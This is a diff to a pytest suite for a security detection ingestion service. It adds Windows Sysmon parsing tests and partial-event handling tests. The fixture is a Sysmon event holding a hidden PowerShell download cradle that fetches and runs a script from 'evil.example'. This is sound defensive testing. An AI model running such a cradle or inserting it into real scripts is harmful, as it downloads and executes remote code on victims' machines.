@@ -8,6 +8,7 @@ import tempfile
 import pytest
 
 from collectors.linux.collector import LinuxCollector
+from collectors.windows.collector import WindowsCollector
 from core.correlator import Correlator, load_chain_rules
 from core.database import AlertDatabase
 from core.engine import DetectionEngine
@@ -17,7 +18,9 @@ from core.ingest import (
     IngestionService,
     chunked,
     linux_auditd_parser,
+    normalize_parse_result,
     read_new_text,
+    windows_sysmon_parser,
 )
 from core.rule_loader import RuleLoader
 
@@ -37,6 +40,30 @@ def curl_event(ts, sid, pid):
     # Vary the URL so each event has a distinct fingerprint (pid alone is
     # not part of the dedup fingerprint).
     return CURL_EVENT.format(ts=ts, sid=sid, pid=pid, payload=f"stage{sid}")
+
+
+# Minimal Sysmon Event ID 1 (process creation) for a PowerShell cradle.
+SYSMON_EVENT = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <EventID>1</EventID>
+    <TimeCreated SystemTime="2025-01-15T11:05:0{n}.000000Z" />
+    <Computer>WORKSTATION01</Computer>
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2025-01-15 11:05:0{n}.000</Data>
+    <Data Name="ProcessId">0x{pid}</Data>
+    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/stage{n}.ps1')"</Data>
+    <Data Name="User">WORKSTATION01\\victim</Data>
+    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
+    <Data Name="ParentProcessId">0x1abc</Data>
+  </EventData>
+</Event>
+"""
+
+
+def sysmon_event(n, pid):
+    return SYSMON_EVENT.format(n=n, pid=pid)
 
 
 @pytest.fixture
@@ -82,6 +109,20 @@ class TestChunked:
     def test_invalid_size(self):
         with pytest.raises(ValueError):
             list(chunked([1, 2], 0))
+
+
+class TestNormalizeParseResult:
+    def test_bare_list_consumes_all(self):
+        events, consumed = normalize_parse_result(["a", "b"], "hello")
+        assert events == ["a", "b"]
+        assert consumed == len("hello")
+
+    def test_tuple_passthrough_clamped(self):
+        events, consumed = normalize_parse_result((["a"], 3), "hello")
+        assert consumed == 3
+        # consumed is clamped to text length
+        _, clamped = normalize_parse_result((["a"], 999), "hi")
+        assert clamped == 2
 
 
 class TestReadNewText:
@@ -218,6 +259,49 @@ class TestIngestionService:
         assert summary["events_processed"] == 25
         assert summary["batches"] == 3
         assert summary["alerts_new"] == 25
+
+    def _win_service(self, temp_db, batch_size=10):
+        engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
+        parser = windows_sysmon_parser(WindowsCollector())
+        return IngestionService(temp_db, engine, parser, batch_size=batch_size)
+
+    def test_windows_multi_event_ingest(self, temp_db, logfile):
+        with open(logfile, "w") as f:
+            f.write(sysmon_event(1, "aa01"))
+            f.write(sysmon_event(2, "aa02"))
+        summary = self._win_service(temp_db).ingest_file(logfile)
+        assert summary["events_processed"] == 2
+        assert summary["alerts_new"] == 2
+
+    def test_windows_partial_trailing_element_held_back(self, temp_db, logfile):
+        # Write two complete events plus the opening of a third (no </Event>).
+        full = sysmon_event(1, "bb01") + sysmon_event(2, "bb02")
+        partial = sysmon_event(3, "bb03")
+        partial_open = partial[: partial.index("</Event>")]
+        with open(logfile, "w") as f:
+            f.write(full + partial_open)
+
+        svc = self._win_service(temp_db)
+        first = svc.ingest_file(logfile)
+        assert first["events_processed"] == 2  # third held back
+        # Offset stops exactly at the end of the last complete </Event>,
+        # before the trailing newline and the partial third element.
+        expected = full.rindex("</Event>") + len("</Event>")
+        assert first["end_offset"] == expected
+
+        # Complete the third event; only it is processed on the next run.
+        with open(logfile, "w") as f:
+            f.write(full + partial)
+        second = svc.ingest_file(logfile)
+        assert second["events_processed"] == 1
+        assert second["alerts_new"] == 1
+
+    def test_windows_reingest_noop(self, temp_db, logfile):
+        with open(logfile, "w") as f:
+            f.write(sysmon_event(1, "cc01"))
+        svc = self._win_service(temp_db)
+        svc.ingest_file(logfile)
+        assert svc.ingest_file(logfile)["events_processed"] == 0
 
     def test_rotation_restarts_and_reprocesses(self, temp_db, logfile):
         with open(logfile, "w") as f:
